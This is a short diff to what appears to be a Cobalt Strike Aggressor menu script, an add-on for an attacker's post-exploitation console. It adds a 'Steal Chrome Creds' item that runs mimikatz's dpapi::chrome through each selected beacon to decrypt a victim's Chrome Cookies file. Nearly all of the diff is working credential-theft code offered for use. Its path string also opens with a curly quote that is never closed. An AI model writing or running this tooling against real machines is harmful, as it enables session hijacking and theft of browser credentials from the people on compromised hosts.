@@ -10,7 +10,7 @@
 
 popup beacon_top {
 
-	menu "Enumeration" {
+	menu "Extension Kit" {
 
 
 
@@ -357,6 +357,18 @@ menu "Credentials and Kerberos"
 				}
 
 			}
+			
+		item "Steal Chrome Creds AKA dpapi::chrome"{
+
+			local('$bid');
+
+				foreach $bid ($1){
+
+					dpapichrome($bid);
+
+				}
+
+			}
 
 
 
@@ -402,6 +414,17 @@ menu "Credentials and Kerberos"
 ##
 
 ###########################
+
+
+sub dpapichrome{
+
+
+
+bmimikatz($1, "dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Cookies");
+
+
+
+}
 
 sub webvaultcmd{
 
